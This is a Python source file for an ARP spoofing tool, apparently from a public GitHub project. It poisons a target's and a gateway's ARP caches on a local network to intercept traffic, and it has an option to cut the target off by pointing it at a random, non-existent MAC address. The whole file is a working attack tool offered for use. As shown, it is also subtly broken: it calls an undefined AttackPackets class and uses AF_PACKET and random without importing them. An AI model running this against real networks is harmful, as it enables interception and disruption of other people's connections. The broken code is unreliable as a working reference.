#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

import argparse
import time
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW

from packets import ARPSetupProxy


class Spoofer(object):
    def __init__(self, interface: str):
        self.interface = interface

    def execute(self, spoofed_packets, interval: float = 0.5):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            while True:
                for packet in spoofed_packets:
                    sock.send(packet)
                time.sleep(interval)


def spoof(args):
    """Controls the flow of execution of the ARP Spoofer tool."""

    packets = AttackPackets(attacker_mac=args.attackermac,
                            gateway_mac=args.gatemac, gateway_ip=args.gateip,
                            target_mac=args.targetmac, target_ip=args.targetip)
    spoofer = Spoofer(interface=args.interface)

    print('[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
    try:
        spoofer.execute(packets, interval=args.interval)
    except KeyboardInterrupt:
        raise SystemExit('[!] ARP Spoofing attack terminated.')


def get_interface_mac_address(interface: str):
    with socket(AF_PACKET, SOCK_RAW) as sock:
        try:
            sock.bind((interface, 0))
        except OSError:
            raise SystemExit('Error: Cannot find specified interface {}.'
                             .format(interface))
        mac_address = sock.getsockname()[4]
    return mac_address.hex(':')


def generate_random_mac():
    hex_values = '0123456789ABCDEF'
    return ':'.join(''.join(random.choices(hex_values, k=2)) for _ in range(6))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('--interval', type=float, default=0.5, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 0.5 seconds).')
    parser.add_argument('--disassociate', action='store_true',
                        help='Execute a disassociation attack in which a '
                             'randomized MAC address is set for the attacker '
                             'machine, effectively making the target host send '
                             'packets to a non-existent gateway.')
    cli_args = parser.parse_args()

    if cli_args.disassociate is True:
        cli_args.attackermac = generate_random_mac()
    else:
        cli_args.attackermac = get_interface_mac_address(cli_args.interface)

    spoof(cli_args)
